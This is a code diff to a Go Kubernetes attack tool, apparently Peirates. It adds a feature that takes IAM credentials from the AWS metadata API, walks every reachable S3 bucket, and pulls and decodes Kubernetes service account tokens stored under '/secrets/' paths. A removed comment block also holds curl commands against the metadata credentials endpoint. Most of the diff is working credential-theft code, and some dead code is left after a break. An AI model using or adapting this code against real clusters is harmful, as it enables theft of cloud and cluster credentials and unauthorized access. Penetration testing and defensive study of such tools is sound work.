@@ -28,6 +28,9 @@ import (
 	"os/exec"  // for exec
 	"regexp"
 	"time" // Time modules
+
+	"github.com/aws/aws-sdk-go/aws"
+	"github.com/aws/aws-sdk-go/service/s3"
 	// kubernetes client
 )
 
@@ -486,6 +489,9 @@ type GetNodeDetails struct {
 			} `json:"addresses"`
 		} `json:"status"`
 	} `json:"items"`
+}
+type AWSS3BucketObject struct {
+	Data string `json:"Data"`
 }
 
 // GetPodsInfo gets details for all pods in json output and stores in PodDetails struct
@@ -998,6 +1004,7 @@ Steal Service Accounts   |
 [13] Request IAM credentials from GCP Metadata API [get-gcp-token]
 [14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
 [15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloud only) [attack-kops-gcs-1] 
+[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1] 
 --------------------------------+
 Interrogate/Abuse Cloud API's   |
 --------------------------------+
@@ -1333,7 +1340,14 @@ Leave off the "kubectl" part of the command.  For example:
 		// [12] Request IAM credentials from AWS Metadata API [AWS only]
 		case "12", "get-aws-token":
 			// Pull IAM credentials from the Metadata API, store in a struct and display
-			awsCredentials = PullIamCredentialsFromAWS()
+
+			result, err := PullIamCredentialsFromAWS()
+			if err != nil {
+				println("[-] Operation failed.")
+				break
+			}
+
+			awsCredentials = result
 			DisplayAWSIAMCredentials(awsCredentials)
 
 			break
@@ -1382,30 +1396,6 @@ Leave off the "kubectl" part of the command.  For example:
 			for _, line := range kubeEnvLines {
 				println(line)
 			}
-
-			break
-
-		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
-		case "16":
-			// Implement this
-
-			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
-			//
-			// Calculate the authorization stuff required:
-			// https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-auth-using-authorization-header.html
-			// https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-header-based-auth.html
-			//
-			// List bucket contents:
-			// https://docs.aws.amazon.com/AmazonS3/latest/API/v2-RESTBucketGET.html
-
-			// Get the object contents:
-			// https://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectGET.html
-
-			// GET /?list-type=2 HTTP/1.1
-			// Host: BucketName.s3.amazonaws.com
-			// Date: date
-			// Authorization: authorization string (see Authenticating Requests (AWS Signature Version 4))
 
 			break
 
@@ -1530,15 +1520,163 @@ Leave off the "kubectl" part of the command.  For example:
 
 			break
 
+		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
+		case "16":
+			var storeTokens string
+			placeTokensInStore := false
+
+			println("[1] Store all tokens found in Peirates data store")
+			println("[2] Retrieve all tokens - I will copy and paste")
+			fmt.Scanln(&storeTokens)
+			storeTokens = strings.TrimSpace(storeTokens)
+
+			if storeTokens == "1" {
+				placeTokensInStore = true
+			}
+
+			if placeTokensInStore {
+				println("Saving tokens to store")
+			}
+
+			// Hit the metadata API only if AWS creds aren't loaded already.
+			var credentialsToUse AWSCredentials
+			if len(assumedAWSrole.AccessKeyId) > 0 {
+				credentialsToUse = assumedAWSrole
+			} else if len(awsCredentials.AccessKeyId) > 0 {
+				credentialsToUse = awsCredentials
+			} else {
+				println("Pulling AWS credentials from the metadata API.")
+				result, err := PullIamCredentialsFromAWS()
+				if err != nil {
+					println("[-] Could not get AWS credentials from metadata API.")
+					break
+				}
+				println("[+] Got AWS credentials from metadata API.")
+				awsCredentials = result
+				credentialsToUse = awsCredentials
+			}
+
+			println("[+] Preparing to use this AWS account to list and search S3 buckets: " + awsCredentials.AccessKeyId)
+
+			result, err := ListAWSBuckets(credentialsToUse)
+			if err != nil {
+				println("Could not list buckets")
+				break
+			}
+			listOfBuckets := result
+
+			// Start a single S3 session
+			svc := StartS3Session(credentialsToUse)
+
+			// Look in every bucket for an oject that has a subdirectory called "secrets" in it.
+			for _, bucket := range listOfBuckets {
+				println("\n\n=============================================\n\n")
+				println("Listing items in bucket " + bucket)
+
+				// Get the list of items
+				resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
+				if err != nil {
+					println("Unable to list items in bucket %q, %v", bucket, err)
+					break
+				}
+
+				for _, item := range resp.Contents {
+
+					if strings.Contains(*item.Key, "/secrets/") {
+						fmt.Println("Investigating bucket object for tokens:  " + *item.Key)
+
+						result, err := svc.GetObject(&s3.GetObjectInput{
+							Bucket: aws.String(bucket),
+							Key:    aws.String(*item.Key),
+						})
+
+						if err != nil {
+							continue
+						}
+
+						buf := new(bytes.Buffer)
+						buf.ReadFrom(result.Body)
+						jsonOutput := buf.String()
+						byteEncodedJsonOutput := []byte(jsonOutput)
+						// Unmarshall the json into Data : encodedtoken
+
+						var structuredVersion AWSS3BucketObject
+
+						json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
+						encodedToken := structuredVersion.Data
+						println("Encoded token: " + encodedToken)
+						token, err := base64.StdEncoding.DecodeString(encodedToken)
+						if err != nil {
+							println("[-] Could not decode token.")
+						} else {
+							tokenString := string(token)
+							println(tokenString)
+
+							if placeTokensInStore {
+								tokenName := "AWS-acquired: " + string(*item.Key)
+								println("[+] Storing token as:", tokenName)
+								serviceAccount := makeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
+								serviceAccounts = append(serviceAccounts, serviceAccount)
+							}
+						}
+
+					}
+
+				}
+			}
+			break
+
+			// In every bucket URL, look at the objects
+			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
+			// We use the same headers[] from the previous GET request.
+
+			break
+
+			// We use the same headers[] from the previous GET request.
+			// bodyToken := GetRequest(saTokenURL, headers, false)
+			// if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
+			// 	continue eachbucket
+			// }
+			// tokenLines := strings.Split(string(bodyToken), "\n")
+			// // TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
+
+			// for _, line := range tokenLines {
+			// 	// Now parse this line to get the token
+			// 	encodedToken := strings.Split(line, "\"")[3]
+			// 	}
+
+			// }
+
+			break
+
 		case "17", "aws-s3-ls", "aws-ls-s3", "ls-s3", "s3-ls":
 			// [17] List AWS S3 Buckets accessible (Auto-Refreshing Metadata API credentials) [AWS]
 
-			// Altering this to allow self-entered credentials.
-			// var IAMCredentials = PullIamCredentialsFromAWS()
+			var credentialsToUse AWSCredentials
 			if len(assumedAWSrole.AccessKeyId) > 0 {
-				ListBuckets(assumedAWSrole)
+				credentialsToUse = assumedAWSrole
+			} else if len(awsCredentials.AccessKeyId) > 0 {
+				credentialsToUse = awsCredentials
 			} else {
-				ListBuckets(awsCredentials)
+				println("Pulling AWS credentials from the metadata API.")
+				result, err := PullIamCredentialsFromAWS()
+				if err != nil {
+					println("[-] Could not get AWS credentials from metadata API.")
+					break
+				}
+				println("[+] Got AWS credentials from metadata API.")
+				awsCredentials = result
+				credentialsToUse = awsCredentials
+			}
+
+			result, err := ListAWSBuckets(credentialsToUse)
+			if err != nil {
+				println("List bucket operation failed.")
+				break
+			}
+
+			for _, bucket := range result {
+				println(bucket)
 			}
 
 			break
